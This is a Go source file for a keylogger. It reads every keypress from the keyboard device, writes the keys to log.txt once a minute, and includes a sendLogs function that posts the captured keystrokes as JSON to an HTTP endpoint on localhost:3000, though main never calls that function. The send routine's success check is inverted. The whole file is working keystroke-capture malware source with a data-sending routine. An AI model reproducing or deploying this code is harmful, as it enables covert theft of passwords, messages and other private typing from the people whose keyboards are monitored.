package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/MarinX/keylogger"
)

var letters = []string{}
var startTime = time.Now().Minute()

type LogJson struct {
	Log []string `json:"log"`
}

func saveInput(letter string) {
	letters = append(letters, letter)
}

func writeOnFile(letters []string) {
	file, err := os.Create("log.txt")
	if err != nil {
		panic("error to create file")
	}

	defer file.Close()

	for _, v := range letters {
		_, error := file.WriteString(v)

		if error != nil {
			panic("error to write on file")
		}
	}

}

func sendLogs(dataLog []string) {

	letters = []string{}

	dataJsonLog := LogJson{
		Log: dataLog,
	}

	dataJsonSer, errSer := json.Marshal(dataJsonLog)

	if errSer != nil {
		panic("error to try serialize data")
	}

	data, errFecth := http.Post("http://localhost:3000/savelogs", "application/json", bytes.NewBuffer(dataJsonSer))

	if errFecth != nil {
		fmt.Println("error fetching data log", errFecth)
	}

	if data.StatusCode != http.StatusOK {
		fmt.Println("log send well", data)
	} else {
		letters = append(dataLog, letters...)
	}

}

func main() {
	keyboard := keylogger.FindKeyboardDevice()
	board, err := keylogger.New(keyboard)

	if err != nil {
		panic("error to open keyboard")
	}

	defer board.Close()

	fmt.Println("press esc for leave")

	events := board.Read()

	for e := range events {
		endTime := time.Now().Minute()
		timeElapsed := endTime - startTime
		if e.KeyPress() {
			saveInput(e.KeyString())
			fmt.Println(e.KeyString())

			if timeElapsed >= 1 {
				fmt.Printf("a minute has ben pased %d", timeElapsed)
				writeOnFile(letters)
				startTime = time.Now().Minute()
			}
		}
	}
}
